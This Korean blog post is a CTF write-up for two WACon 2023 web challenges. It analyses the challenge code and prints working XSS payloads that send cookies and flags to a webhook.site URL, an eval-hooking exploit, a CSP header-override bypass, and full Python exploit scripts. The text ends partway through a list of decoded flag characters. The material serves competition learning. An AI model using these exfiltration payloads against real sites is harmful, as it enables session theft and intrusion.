---
layout: post
author: jun0911
title: WACon 2023 Final CTF Writeup
tags: [CTF]
---

# [WEB] funnyjs

### TL;DR

> XSS 문제로, Function 함수에서 강제로 잘못된 변수명 에러를 유발하여 DOM XSS 취약점을 발생 시키는 챌린지 입니다.

### Description

> do you like js?

### Analysis

```html
<head>
	<head>
		<title>funnyjs</title>
	</head>
	<body>
		<script>
			let payload = decodeURIComponent(document.location.hash.slice(1)).replaceAll(/<>/g,'');
			try{
				Function(payload);
			} catch(e){
				let scriptEl = document.createElement('script');
				scriptEl.innerText = payload;
				document.body.appendChild(scriptEl);
			}
		</script>
		<pre style="font-family: sans-serif;">
 ∧,,,∧
(  ̳• · • ̳)
/    づづ plz xss
		</pre>
	</body>
</head>
```

제공하는 파일 내용에서는 ``document.location.hash.slic(1)``으로 입력을 받을 수 있으며, ``greater than sign( < )`` , ``less than sign ( > )``을 replace 합니다.

입력된 페이로드는 ``Function()`` 함수 안에 인자로 들어가고 만약 에러가 발생 된다면 catch 으로 넘어가, DOM XSS 취약점을 발생시킬 수 있도록 유도합니다.

```js
try{
	Function(payload);
} catch(e){
	let scriptEl = document.createElement('script'); // create script element
	scriptEl.innerText = payload; // script tag inner HTML In payload
	document.body.appendChild(scriptEl); // Adding script Element
}
```

위와 같은 코드에서 catch만 보면 script 태그 안에 원하는 페이로드를 넣을 수 있는 아주 간단해 보이는 문제입니다.

Function 함수 안에 들어가는 payload는 에러를 유발하기 위해 아래와 같이 잘못된 변수 이름을 통해 발생되는 에러를 사용했습니다.

```js
let 23a; // 앞에 숫자는 잘못된 변수 명 규칙입니다.
```

script 태그에 들어갔을 때 원하는 페이로드가 실행 된 다음 에러가 발생하게 만들어주면 됩니다.

```js
alert(1);%0alet 23;
```

하지만 단순히 줄바꿈으로 하기에는 innerHTML에서는 ``\n``을 ``<br>`` 태그로 치환하기 때문에 주석을 이용하여 무시하면 됩니다.

```js
// ex,
// <payload>//%0alet 23a;

alert(1);//%0alet 23a;
```

그렇다면 위와 같은 페이로드가 완성되고 ``url.kr#<payload>//%0alet 23a;``와 같이 보내주면 XSS 트리거에 성공하게 됩니다.

![Alt text](https://blog.kakaocdn.net/dn/C5euO/btsv7Bh8RQq/Na1rA2b3WEnBkCF6xirqF1/img.png)

### Exploit

위와 같은 페이로드를 보내기 위해 COOKIE를 탈취하는 페이로드를 작성하면 됩니다.

```js
location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c/?"+document.cookie;//%0alet 23a
```

FLAG를 탈취 하려고 하는 URL은 docker-compose.yml에 있는 것 처럼 ``http://web`` 이므로

```yml
version: "3.9"
services:
  bot:
    build: ./bot/
    restart: always 
    environment:
      - "FLAG=WACON2023{test-flag}"
      - "CAPTCHA_SECRET="
    ports:
      - "8001:8000"
  web:
    image: nginx
    restart: always 
    ports:
      - "8000:80"
    volumes:
      - ./app/static:/var/www/html:ro
      - ./app/nginx.conf:/etc/nginx/conf.d/default.conf:ro
```

다음과 같은 DNS로 맞춰 report를 보내주면 됩니다.

```js
http://web/#location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c/?"+document.cookie;//%0alet 23a
```

![Alt text](https://blog.kakaocdn.net/dn/cImwnR/btsv9LxzDmD/O9reMfu4Ncc84kSk0fcSx1/img.png)

#### FLAG : ``WACON2023{that-wasnt-so-funny-abc32f}``

# [WEB] Cha's eval

### TL;DR

> JS에서 eval function hooking 또는 CSP Header Overwrite으로 FLAG를 탈취하는 문제입니다.

### Description

> Do you know how JS eval() works? Then, how about these comments?
> 
> Note: The web server is running on 80 port inside the docker. (8000 => 80)

### Analysis

챌린지 사이트에 처음 접속해보면 아래와 같은 페이지를 확인해볼 수 있습니다.

![Alt text](https://blog.kakaocdn.net/dn/dNB18q/btsv0vW8bu7/hKbJufIAOzHAruzc1Knvk0/img.png)

Your Script, Single header line, Solve Pow 이렇게 3가지를 입력하게 되면 아래의 PHP 코드로 이동 됩니다.

```php
<?php

include "config.php";

function error($msg) {
    die("
        <script>
            alert('$msg');
            //location.href = 'index.php';
        </script>
    ");
}

$header = $_POST["header"];
$script = $_POST["script"];
$pow = $_POST["pow"];

if(!isset($header) || !isset($script) || !isset($pow)) {
    error("Missing parameter");
}

if (!check_pow($pow)) {
    gen_pow();
    error('Wrong pow');
}
gen_pow();

$header = bin2hex($header);
$script = bin2hex($script);

do {
    $key = sha1(random_bytes(32).time().random_bytes(32));
    $contentfile = "./data/".sha1($SALT.$key);;
} while (file_exists($contentfile));

file_put_contents($contentfile, "$header\n$script");

$param = escapeshellarg($key);
exec("node /app/bot.js {$param}");
```


Pow을 이용하여 검증을 한 다음에 입력한 header와 script가 그대로 ``"./data".sha1($SALT.$key)`` 파일에 저장합니다.

그런 다음, ``랜덤 바이트 + 시간 + 랜덤 바이트`` sha1 encrypt 한 값을 node /app/bot.js에 파라미터로 넘겨줍니다.

```js
const puppeteer = require('puppeteer');

if (process.argv.length != 3) {
	console.error("Invalid invoke");
	process.exit(1);
}

let key = process.argv[2];
const url = "http://localhost/run.php?key=" + key;

(async () => {
  const browser = await puppeteer.launch({
      executablePath: '/usr/bin/google-chrome',
	  args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });
  const page = await browser.newPage();
  page.setDefaultNavigationTimeout(3000);
  await page.goto(url);
  await new Promise(r => setTimeout(r, 17000));
  await browser.close();
})();
```

bot.js 파일에서는 입력 받은 $key를 ``http://localhost/run.php?key=`` 으로 파라미터를 넣고 페이지에 접속하는 것을 볼 수 있습니다.

#### run.php

```php
<?php 
include "config.php";

$nonce = substr(sha1(random_bytes(32)), 16);

header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-$nonce'; base-uri 'none'; connect-src 'none';" );

$key = isset($_GET["key"]) ? $_GET["key"] : "NOPE";
if ($key === "NOPE") {
    die("no");
}


$key = sha1($SALT.$key);
$contentfile = "./data/$key";
if (!file_exists($contentfile)) {
    die("no");
}

$contentdata = file_get_contents($contentfile);

unlink($contentfile);
if (file_exists($contentfile)) { 
    die("no");
}

$data = explode("\n", $contentdata);

$header = hex2bin(trim($data[0]));
$script = hex2bin(trim($data[1]));

header($header, false);
?>

<html>
    <head>
        <div id="flag_container">
            <script nonce="<?=$nonce?>">
                window.setTimeout(() => {
                    
                    let tester = 0, tmp = 0;
                    <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>
                    
                    // no winning race
                    tmp = 0;
                    for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
                        tmp += 1;

                    // never pollute eval
                    tester = 0;
                    eval("tester = 1");
                    if(tester === 0) {
                        return;
                    }
                    
                    // no winning race
                    tmp = 0;
                    for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
                        tmp += 1;

                    eval("////////////////////////////////////////$flag[<?= $i ?>] = <?= $FLAG[$i] ?>"); 
                    <?php } ?>

                }, 2000);
            </script>
        </div>
    </head>
    <body>
        <script nonce="<?=$nonce?>">
            (() => { 
                let flag_container = document.getElementById("flag_container");
                document.body.removeChild(flag_container);
                window.setTimeout = window.setInterval = null;
            })();
        </script>

        <script nonce="<?=$nonce?>">
            // User code goes here
            <?= $script ?>
        </script>
    </body>
</html>
```

해당 문제에서 run.php 파일이 핵심인데 분석을 진행 하겠습니다.

랜덤 값이 들어간 nonce를 script-src에 걸어준 다양한 정책이 존재하는 CSP 헤더를 생성 합니다.

그리고 아까 file_put_contents 으로 ``$header\n$script`` 내용이 들어간 파일을 읽고 난 다음 각각 $header, $script 변수에 넣어주는 것을 볼 수 있습니다.

```php
$nonce = substr(sha1(random_bytes(32)), 16);
// 랜덤 $nonce 

header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-$nonce'; base-uri 'none'; connect-src 'none';" );
// CSP 헤더 생성

$key = isset($_GET["key"]) ? $_GET["key"] : "NOPE";
if ($key === "NOPE") {
    die("no");
}


$key = sha1($SALT.$key);
$contentfile = "./data/$key";
if (!file_exists($contentfile)) {
    die("no");
}

$contentdata = file_get_contents($contentfile); // 아까 $header\n$script 으로 저장했던 파일 읽어오기

unlink($contentfile);
if (file_exists($contentfile)) { 
    die("no");
}

$data = explode("\n", $contentdata);

$header = hex2bin(trim($data[0])); // header
$script = hex2bin(trim($data[1])); // script

header($header, false); // 새로운 헤더 생성
```

그런 다음 $header을 그대로 header 함수에 넣어서 우리가 입력한 값으로 원하는 헤더를 생성합니다.

```php
<script nonce="<?=$nonce?>">
    // User code goes here
    <?= $script ?>
</script>
```

그리고 $script 변수는 제일 하단에 있는 script 태그에 그대로 넣어 XSS에 취약하도록 만듭니다.

이로써, $header 변수는 원하는 헤더를 생성 시키고, $script는 원하는 JS 코드를 작성할 수 있다는 것을 알 수 있습니다.

---

```php
<div id="flag_container">
    <script nonce="<?=$nonce?>">
        window.setTimeout(() => {

            let tester = 0, tmp = 0;
            <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>

            // no winning race
            tmp = 0;
            for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
                tmp += 1;

            // never pollute eval
            tester = 0;
            eval("tester = 1");
            if(tester === 0) {
                return;
            }

            // no winning race
            tmp = 0;
            for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
                tmp += 1;

            eval("////////////////////////////////////////$flag[<?= $i ?>] = <?= $FLAG[$i] ?>"); 
            <?php } ?>

        }, 2000);
    </script>
</div>
```

다음으로, 중간에 있는 script 태그를 살펴보면 $FLAG의 길이만큼 반복하면서 ``// never pollute eval`` 주석에 있는 부분에서 ``tester === 1``을 이용해 eval 함수가 제대로 작동 하는지 테스트 합니다.

그렇게 정상적으로 실행이 되면 마지막에는 eval 함수에 ``////////////// ... $flag[<?= $i ?>] = <?= $FLAG[$i] ?>`` 주석을 넣고 $flag 코드가 ``$flag[0] = "W"`` 이런 식으로 들어가도록 실행 되는 것을 알 수 있습니다.

하지만 주석 처리 되기 때문에 단순히 JS 코드 단에서 주석으로 ``$FLAG[$i]``가 들어가기만 합니다.

--

```php
<script nonce="<?=$nonce?>">
    (() => { 
        let flag_container = document.getElementById("flag_container");
        document.body.removeChild(flag_container);
        window.setTimeout = window.setInterval = null;
    })();
</script>
```

마지막으로, 다른 script 태그를 보면 위에서 eval 함수를 실행 시키고 $FLAG를 주석에 하고 등등 다양한 코드를 실행 한 다음

flag_container을 document.body에서 removeChild를 수행하여 flag_container id를 가지고 있는 HTML 태그를 없애버리고

window.setTimeout, window.setInterval을 null로 만들게 됩니다.

### Pow Leak

이제 어느정도 분석을 했으니 요청을 하기 위해 Pow 코드를 분석 하겠습니다.

```php
<?php

$FLAG = "WACon2023{REDACTED}";
$SALT = "REDACTED";

session_start();

function gen_pow($len = 5) {
    $str = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%";
    $nonce = "";
    $check = "";
    for($i = 0; $i < $len; $i++) {
        $nonce .= $str[random_int(0, strlen($str) - 1)];
        $check .= $str[random_int(0, strlen($str) - 1)];
    }

    $ans = sha1($nonce . $check);

    $_SESSION["pow_nonce"] = $nonce;
    $_SESSION["pow_answer"] = $ans;

    return array($nonce, $ans);
}

function check_pow($input) {
    $check = sha1($_SESSION["pow_nonce"] . $input);
    return $check === $_SESSION["pow_answer"];
}
```

해당 gen_pow 함수에서는 $nonce, $check 두개의 랜덤 값을 sha1 encrypt하여 $_SESSION["pow_answer"]에 넣어주는데, sha1은 이미 다른 값으로도 똑같은 해쉬를 만들어낼 수 있는 안전하지 않은 알고리즘이다.

때문에 ``sha1($_SESSION["pow_nonce"]. $input)``이 $_SESSION["pow_answer"]와 똑같은 해쉬가 나올 수 있도록 무차별 대입을 진행하면 됩니다.

```python
import hashlib
import requests
import random
import itertools

script = open('script.js', 'r').read()

ascii = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%"

nonce = ""
check = ""

flag = 0

hashText = ""

def sha1(text):
    m = hashlib.sha1()
    m.update(text.encode('utf-8'))
    return m.hexdigest()

res = requests.get("http://58.229.185.61:8000/index.php", cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
})

nonce = res.text.split("sha1")[1].split("==")[0].split('"')[1]

hashText = res.text.split("sha1")[1].split("==")[1].split("</code>")[0].strip()

leakCheck = ""

for brute in itertools.product(ascii, repeat=5):
    check = ''.join(brute)
    if sha1(nonce + check) == hashText:
        leakCheck = check
        print("hash leak!, check : ", check)
        break
```

itertools.product 함수를 이용하여 nonce + check 해쉬가 일치할 때 까지 반복하여 찾아내면 됩니다.

### Scenario

해당 챌린지의 공격 방법은 총 2 단계가 존재합니다.

```
1. eval Function Hooking
2. CSP Bypass
```

### 1. eval Function Hooking

가장 간단하게 챌린지를 해결할 수 있는 방법입니다.

```php
<div id="flag_container">
    <script nonce="<?=$nonce?>">
        window.setTimeout(() => {
            let tester = 0, tmp = 0;
            <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>

            ...

            // never pollute eval
            tester = 0;
            eval("tester = 1");
            if(tester === 0) {
                return;
            }

            ...

            eval("////////////////////////////////////////$flag[<?= $i ?>] = <?= $FLAG[$i] ?>"); 
            <?php } ?>

        }, 2000);
    </script>
</div>
```

먼저, $script와 $header 값을 우리가 입력할 수 있고 $script 태그를 이용하여 JS 코드를 실행합니다.

하지만 window.setTimeout으로 인해 2000ms 정도 delay를 가진 다음 플래그 값이 포함된 eval 함수를 실행하게 됩니다.


```js
eval = (data) => {
	console.log(data);
}
```

그러면 window.setTimeout으로 인해 늦게 실행되고, 원하는 JS 코드를 실행 할 수 있다는 점을 이용하여 eval 함수를 재정의해서 Hooking을 진행하면 되는 것을 알 수 있습니다.

위와 같이 재정의를 하게 되면 eval 함수 안에 들어가는 값을 원하는대로 조작을 할 수 있게 됩니다.

```php
<div id="flag_container">
    <script nonce="<?=$nonce?>">
        window.setTimeout(() => {
            let tester = 0, tmp = 0;
            <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>

            ...

            // never pollute eval
            tester = 0;
            eval("tester = 1");
            if(tester === 0) {
                return;
            }

            ...

        }, 2000);
    </script>
</div>
```

챌린지에서 tester = 0으로 설정하고 eval을 이용해 tester 값을 1로 변경합니다, 현재 eval을 재정의할 수 있는 방법은 아래의 코드에서 재정의할 수 있는데 여기서 tester 값을 1로 변경해려면 setTimeout 함수의 내부 스코프에 접근해야합니다.

```php
<script nonce="<?=$nonce?>">
    // User code goes here
    <?= $script ?>
</script>
```

간단하게 eval("tester = 1")를 추가로 진행하도록 설정하게 된다면 eval이 실행되는 기본 스코프는 전역 스코프임으로, 
setTimeout 함수 내부에 eval 함수를 호출하지 않는 이상 밖에서 tester의 값을 변경하게되면 전역스코프의 tester 변수의 값을 변경시킵니다.

그러면 지역 스코프의 tester 변수의 값이 변경되지 않음으로 if (tester === 0) 이라는 조건에 걸리게 됩니다.

이와 같은 문제를 해결하기 위해서는 javascript의 caller/callee를 사용할 수 있습니다.

caller를 사용하면 위의 문제를 해결할 수 있습니다. caller는 자신을 호출한 함수를 가리킵니다.

그러면 eval 함수를 재정의하여 호출한 caller를 가져오고 해당 함수를 toString으로 변환하면 굳이 if (tester === 0) 조건을 통과할 필요 없이 현재 정의되어있는 함수의 코드를 가져올 수 있습니다.

아래는 eval 함수를 재정의 하여 caller를 사용해 조건을 통과할 수 있는 예시입니다.

```js
FLAG = "secretFlag";

function test() {
	tester = 0; 
    
    eval("tester = 1");
    
    if (tester === 0) { return; }
    
    // secret
    for (let i = 0; i < FLAG.length; i++) {
    	eval("// flag :" + FLAG[i]);
    }
}

eval = (data) => {
	console.log(data.caller.toString());
}

test();

/*
-> result == function test() {
	tester = 0; 
    
    eval("tester = 1");
    
    if (tester === 0) { return; }
    
    // secret
    
   eval("// flag :s");
    eval("// flag :e");
    eval("// flag :c");
    eval("// flag :r");
    eval("// flag :e");
    eval("// flag :t");
    eval("// flag :F");
    eval("// flag :l");
    eval("// flag :a");
    eval("// flag :g");
}
*/
```

caller에는 호출한 함수의 원형이 담기므로 설정되어있는 flag를 Leak할 수 있습니다.

그 이후 정규표현식을 이용해, flag 값만을 추출하여 공격자의 서버로 전달시키도록 Exploit payload를 작성할 수 있습니다.

아래는 eval hooking을 진행하여 flag를 얻어내는 exploit 코드입니다.

```js
org_eval = eval;

function myFunc() {
    console.log("OK");
    if (myFunc.caller === null) {
        console.log("The function was called from the top!");
    } else {

        let scripts = myFunc.caller.toString();

        if(strings == "tester = 1"){
            var tester = 1;
        }

        let reg = new RegExp(/eval\(\"\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\$flag\[[0-9]+\] = (.+)\"\)/g);


        const matches = scripts.matchAll(reg);
        let flags = "";

        for (const match of matches) {
            flags += match[1];
            console.log(match.index)
        }

        location.href = `https://webhook.site/ce5c0ed9-5dc9-484e-9ce4-07a487e35aa0?a=` + encodeURIComponent(flags);
        return;
    }
}

eval = myFunc
```

위 코드를 확인해보면 eval 함수를 재정의하고 있습니다, eval 함수를 호출한 caller를 가져와서 caller가 없으면 아무것도 실행하지 않고, caller가 존재한다면 scripts에 호출한 caller의 toString을 사용해 문자열을 가져옵니다.

그 이후 정규표현식을 이용해서 가져온 caller의 함수 문자열과 일치하는 부분을 가져옵니다.

이를 FLAG의 길이만큼 반복하고 flags 변수에 저장하도록 합니다. flags 변수에 모두 값이 저장되었으면, webhook을 이용해 유출한 flags 값을 보낼 수 있습니다.

전체 Full Exploit 코드입니다.

```python
import hashlib
import requests
import random
import itertools

script = open('script.js', 'r').read()

ascii = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%"

nonce = ""
check = ""

flag = 0

hashText = ""

def sha1(text):
    m = hashlib.sha1()
    m.update(text.encode('utf-8'))
    return m.hexdigest()

res = requests.get("http://58.229.185.61:8000/index.php", cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
})

nonce = res.text.split("sha1")[1].split("==")[0].split('"')[1]

hashText = res.text.split("sha1")[1].split("==")[1].split("</code>")[0].strip()

leakCheck = ""

for brute in itertools.product(ascii, repeat=5):
    check = ''.join(brute)
    if sha1(nonce + check) == hashText:
        leakCheck = check
        print("hash leak!, check : ", check)
        break


print("Send Pow : ", leakCheck)

res2 = requests.post("http://58.229.185.61:8000/submit.php", headers={
    "Content-Type": "application/x-www-form-urlencoded"
}, cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
}, data={
    "header": "",
    "script": """
    org_eval = eval;

    function myFunc() {
        console.log("OK");
        if (myFunc.caller === null) {
            console.log("The function was called from the top!");
        } else {
            let scripts = myFunc.caller.toString();
            let reg = new RegExp(/eval\(\"\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\$flag\[[0-9]+\] = (.+)\"\)/g);


            const matches = scripts.matchAll(reg);
            let flags = "";

            for (const match of matches) {
                flags += match[1];
                console.log(match.index)
            }

            location.href = `https://webhook.site/ce5c0ed9-5dc9-484e-9ce4-07a487e35aa0?a=` + encodeURIComponent(flags);
            return;
        }
    }

    eval = myFunc
    """,
    "pow": leakCheck
})
print(res2.text)
```

위 Exploit 코드를 사용하게 되면 pow를 이용해 eval hooking 코드가 동작하게 되어서, Leak한 FLAG를 webhook으로 전달받을 수 있습니다.

#### FLAG : ``WACon2023{b6ee5fc687a677bb1baf7285dca31b675f68c9d7e6ddd8a92b84d54d41729d5e}``

### 2. CSP Bypass

CSP Bypass 방법에서는 flag_container id를 가지고 있는 div 태그 안에 있는 script 태그에 FLAG 내용이 전부 들어있기 떄문에

CSP 헤더 조작을 이용하여 script 태그 내용을 전부 탈취하는 방법입니다.

먼저 CSP 헤더를 보겠습니다.

```php
header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-$nonce'; base-uri 'none'; connect-src 'none';" );

[ ... ]

header($header, false);
```

$header 함수를 원하는대로 입력할 수 있다는 점을 이용하여 새로운 헤더를 생성할 수 있는데, header 함수의 두 번째 인자가 false으로 되어 있다면 기존에 있는 헤더를 덮어쓰기 할 수 있습니다.

그러면 단순하게 CSP 헤더를 덮어쓰면서 XSS 취약점을 발생시켜 script 태그 내용을 가져오기에는 아래와 같이 flag_container을 아에 삭제해버리는 문제가 발생합니다.

```html
<script nonce="<?=$nonce?>">
    (() => { 
        let flag_container = document.getElementById("flag_container");
        document.body.removeChild(flag_container);
        window.setTimeout = window.setInterval = null;
    })();
</script>

<script nonce="<?=$nonce?>">
    // User code goes here
    <?= $script ?>
</script>
```

그렇다면 위에 있는 flag_container id의 tag를 삭제하는 코드는 실행하지 않고, 우리가 입력한 아래의 script 태그가 실행 되도록 만들어야 됩니다.

때마침 CSP 헤더에서는 script-src 정책을 이용하여 리소스 로드를 차단하는 방법은 hash ( sha-N ), nonce('nonce-N') 2가지 방법이 존재합니다.

```php
header("Content-Security-Policy: script-src 'nonce-123'");
// script 태그의 nonce 속성이 123이 아니면 리소스 로드 차단

header("Content-Security-Policy: script-src 'sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc='");
// JS 전체 Code Block을 SHA-256 해쉬와 한 값과 CSP 헤더의 sha256과 일치하지 않으면 리소스 로드 차단
```

이렇게 2가지의 검증 방법을 이용하여 flag_container를 삭제하는 코드와 일치하지 않는 sha256 해쉬를 넣어주면 실행이 되지 않을 것이고

아래 우리가 입력할 페이로드를 sha256 해쉬를 알아낸 다음 CSP 헤더에 추가하여 트리거를 하면 입력한 페이로드만 실행이 됩니다.


그러면 입력할 페이로드를 sha256 해쉬화 한 값을 알아내기 위해 아래와 같이 bot.js 코드를 수정하여 SHA 해쉬를 담은 CSP 헤더 에러를 출력하게 만듭니다.

```js
const puppeteer = require('puppeteer');

if (process.argv.length != 3) {
        console.error("Invalid invoke");
        process.exit(1);
}

let key = process.argv[2];
const url = "http://localhost/run.php?key=" + key;

(async () => {
  const browser = await puppeteer.launch({
      executablePath: '/usr/bin/google-chrome',
          args: ['--no-sandbox', '--disable-setuid-sandbox'],
          dumpio: true
  });
  const page = await browser.newPage();
   page
    .on('console', message =>
      console.log(`${message.type().substr(0, 3).toUpperCase()} ${message.text()}`))
    .on('pageerror', ({ message }) => console.log(message))
    .on('response', response =>
      console.log(`${response.status()} ${response.url()}`))
    .on('requestfailed', request =>
      console.log(`${request.failure().errorText} ${request.url()}`))
  const client = await page.target().createCDPSession();

  // Enable reporting of security issues
  await client.send('Security.enable');

  // Listen for CSP violations
  client.on('Security.violationReceived', violation => {
    console.log(`CSP VIOLATION: ${violation.violationType}`);
  });
  page.setDefaultNavigationTimeout(3000);
  await page.goto(url);
  const content = await page.content();
  console.log(content);
  await new Promise(r => setTimeout(r, 17000));
  await browser.close();
})();
```

위와 같이 코드를 작성하고 script를 실행하면 아래와 같이 CSP 에러를 확인해서 script src의 sha 값을 알아낼 수 있습니다.

```js
root@db99c6a029db:/app# node bot.js 40b79e3aa9a821667d849fc1d385606af05b1bc2

  Puppeteer old Headless deprecation warning:
    In the near future `headless: true` will default to the new Headless mode
    for Chrome instead of the old Headless implementation. For more
    information, please see https://developer.chrome.com/articles/new-headless/.
    Consider opting in early by passing `headless: "new"` to `puppeteer.launch()`
    If you encounter any bugs, please report them to https://github.com/puppeteer/puppeteer/issues/new/choose.

[0926/045001.951716:ERROR:bus.cc(406)] Failed to connect to the bus: Failed to connect to socket /run/dbus/system_bus_socket: No such file or directory
[0926/045001.954721:ERROR:bus.cc(406)] Failed to connect to the bus: Failed to connect to socket /run/dbus/system_bus_socket: No such file or directory
[0926/045001.954761:ERROR:bus.cc(406)] Failed to connect to the bus: Failed to connect to socket /run/dbus/system_bus_socket: No such file or directory

DevTools listening on ws://127.0.0.1:42349/devtools/browser/1177a493-1f17-46c4-abec-e7de4c381532
[0926/045001.959360:WARNING:bluez_dbus_manager.cc(247)] Floss manager not present, cannot set Floss enable/disable.
[0926/045001.963863:WARNING:sandbox_linux.cc(393)] InitializeSandbox() called with multiple threads in process gpu-process.
200 http://localhost/run.php?key=40b79e3aa9a821667d849fc1d385606af05b1bc2
ERR Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w='". Either the 'unsafe-inline' keyword, a hash ('sha256-3tmYDkIW3ItyGzvEh7kwQeVY9ElmiKthdw0R0y4LWTw='), or a nonce ('nonce-...') is required to enable inline execution.

ERR Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w='". Either the 'unsafe-inline' keyword, a hash ('sha256-hkXh22V8WBWlVTnSW180HfhNuhvoyfrWW0dy3toa074='), or a nonce ('nonce-...') is required to enable inline execution.

ERR Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w='". Either the 'unsafe-inline' keyword, a hash ('sha256-oVXtSIZ6oNv1VsBLKmao2GyCIe7BBHc/4lk633L90Uc='), or a nonce ('nonce-...') is required to enable inline execution.
```

에러 로그를 살펴보면 입력했던 페이로드 값이 T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w= 인 것을 확인할 수 있습니다.

이런식으로 sha256을 알아내어 페이로드를 입력하면 입력한 페이로드가 들어간 JS 코드만 실행하게 되면서 flag_container을 제거하는 코드는 실행이 되지 않습니다.


```js
const regex = /eval\(([^)]+)\)/g; let st = ''; while ((matches = regex.exec(document.getElementById("flag_container").innerHTML)) !== null) {st+=matches[1];}location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c?flag="+btoa(st);
```

위와 같이 flag_container id Element에 있는 FLAG가 포함 되어 있는 eval 함수를 모두 regex으로 가져온 다음 해당 값들을 webhook에 요청하게 만들어 탈취하면 됩니다.

Full Exploit 코드는 아래와 같습니다.

```python
import hashlib
import requests
import random
import itertools

script = open('script.js', 'r').read()

ascii = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%"

nonce = ""
check = ""

flag = 0

hashText = ""

def sha1(text):
    m = hashlib.sha1()
    m.update(text.encode('utf-8'))
    return m.hexdigest()

res = requests.get("http://58.229.185.61:8000/index.php", cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
})

nonce = res.text.split("sha1")[1].split("==")[0].split('"')[1]

hashText = res.text.split("sha1")[1].split("==")[1].split("</code>")[0].strip()

leakCheck = ""

for brute in itertools.product(ascii, repeat=5):
    check = ''.join(brute)
    if sha1(nonce + check) == hashText:
        leakCheck = check
        print("hash leak!, check : ", check)
        break


print("Send Pow : ", leakCheck)

res2 = requests.post("http://58.229.185.61:8000/submit.php", headers={
    "Content-Type": "application/x-www-form-urlencoded"
}, cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
}, data={
    "header": "Content-Security-Policy: script-src 'sha256-S9T+4pxwdCdgDuhSdqdsTSI3li/BHqci69Oa+iw6p7k=';",
    "script": """
    const regex = /eval\(([^)]+)\)/g; let st = ''; while ((matches = regex.exec(document.getElementById("flag_container").innerHTML)) !== null) {st+=matches[1];}location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c?flag="+btoa(st);
    """,
    "pow": leakCheck
})
print(res2.text)
```

위 Exploit 코드를 실행하게 되면 check_pow를 찾고 header를 재설정 한후 script를 실행시키게 됩니다.

webhook으로는 아래와 같이 응답이 오게 됩니다.

![Alt text](https://blog.kakaocdn.net/dn/Rzp2p/btsv7srXkge/3DdHwXax8doVUfwt7Ln3q1/img.png)

base64 인코딩이 되어있음으로 이를 디코딩 하면 아래와 같은 결과가 나타나게됩니다.

```
['////////////////////////////////////////$flag[0] = W', '////////////////////////////////////////$flag[1] = A', '////////////////////////////////////////$flag[2] = C', '////////////////////////////////////////$flag[3] = o', '////////////////////////////////////////$flag[4] = n', '////////////////////////////////////////$flag[5] = 2', '////////////////////////////////////////$flag[6] = 0', '////////////////////////////////////////$flag[7] = 2', '////////////////////////////////////////$flag[8] = 3', '////////////////////////////////////////$flag[9] = {', '////////////////////////////////////////$flag[10] = b', '////////////////////////////////////////$flag[11] = 6', '////////////////////////////////////////$flag[12] = e', '////////////////////////////////////////$flag[13] = e', '////////////////////////////////////////$flag[14] = 5', '////////////////////////////////////////$flag[15] = f', '////////////////////////////////////////$flag[16] = c', '////////////////////////////////////////$flag[17] = 6', '////////////////////////////////////////$flag[18] = 8', '////////////////////////////////////////$flag[19] = 7', '////////////////////////////////////////$flag[20] = a', '////////////////////////////////////////$flag[21] = 6', '////////////////////////////////////////$flag[22] = 7', '////////////////////////////////////////$flag[23] = 7', '////////////////////////////////////////$flag[24] = b', '////////////////////////////////////////$flag[25] = b', '////////////////////////////////////////$flag[26] = 1', '////////////////////////////////////////$flag[27] = b', '////////////////////////////////////////$flag[28] = a', '////////////////////////////////////////$flag[29] = f', '////////////////////////////////////////$flag[30] = 7', '////////////////////////////////////////$flag[31] = 2', '////////////////////////////////////////$flag[32] = 8', '////////////////////////////////////////$flag[33] = 5', '////////////////////////////////////////$flag[34] = d', '////////////////////////////////////////$flag[35] = c', '////////////////////////////////////////$flag[36] = a', '////////////////////////////////////////$flag[37] = 3', '////////////////////////////////////////$flag[38] = 1', '////////////////////////////////////////$flag[39] = b', '////////////////////////////////////////$flag[40] = 6', '////////////////////////////////////////$flag[41] = 7', '////////////////////////////////////////$flag[42] = 5', '////////////////////////////////////////$flag[43] = f', '////////////////////////////////////////$flag[44] = 6', '////////////////////////////////////////$flag[45] = 8', '////////////////////////////////////////$flag[46] = c', '////////////////////////////////////////$flag[47] = 9', 